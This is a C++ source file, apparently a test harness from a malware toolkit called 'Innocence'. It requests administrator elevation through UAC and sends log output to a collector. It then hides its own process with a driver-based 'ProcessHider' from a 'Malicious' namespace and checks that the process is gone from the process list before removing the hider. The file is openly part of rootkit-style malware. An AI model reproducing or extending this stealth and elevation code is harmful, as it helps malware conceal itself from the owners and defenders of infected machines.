#include <algorithm>

#include <malicious/ProcessHider.hpp>
using namespace Malicious;

#include <system/Uac.hpp>
#include <system/Process.hpp>

#include <common/Log.hpp>

#include <Innocence.hpp>

int main(int argc, char * argv[])
{
	int exitCode = EXIT_FAILURE;
    try
	{
        LOG.setIdentity(Innocence::identity);
	    LOG.addObserver(new Common::LogToCollector);
		LOG.addObserver(new Common::LogToConsole);

        System::Process::This thisProcess;
        if(!System::isAdministrator())
	    {
            LOG << "Trying to run as administrator";
		    System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir());
		    return EXIT_SUCCESS;
	    }

        LOG << "Hiding the process";
        ProcessHider hider;
		hider.hide(thisProcess.getProgramName());

		System::Process::Map pm;
		System::Process::GetProcessList(pm);

		for(System::Process::Map::iterator i = pm.begin(); i != pm.end(); i++)
		{
			if(i->second ==  thisProcess.getProgramName())
			{
				exitCode = EXIT_SUCCESS;
				break;
			}
		}
        hider.remove();
	}
    catch(Malicious::DriverError& e)
    {
		LOG << e.what();
    }
	CATCH_UNKNOWN_EXCEPTION
	return exitCode;
}